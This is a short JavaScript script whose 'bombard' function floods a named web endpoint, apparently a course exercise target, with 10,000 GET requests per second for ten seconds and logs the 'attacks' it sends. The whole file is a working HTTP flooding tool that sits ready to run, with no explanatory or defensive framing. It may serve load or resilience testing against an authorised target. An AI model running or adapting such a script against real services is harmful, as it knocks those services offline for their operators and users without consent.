const endpoint = 'https://pizza-factory.cs329.click/api/docs';

function bombard(attacksPerSecond, runTimeInSeconds) {
  let secondsElapsed = 0;
  const intervalId = setInterval(() => {
    secondsElapsed++;
    console.log(`${runTimeInSeconds - secondsElapsed} seconds left`);
    for (let i = 0; i < attacksPerSecond; i++) {
      fetch(endpoint, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' },
      }).then((response) => {
        if (!response.ok) {
          console.error('Error during bombardment:', response.status);
          clearInterval(intervalId);
        }
      })
    }
    console.log(`Attacks sent: ${attacksPerSecond}`);
    if (runTimeInSeconds - secondsElapsed <= 0) {
      clearInterval(intervalId);
    }
  }, 1000);
}

bombard(10000, 10);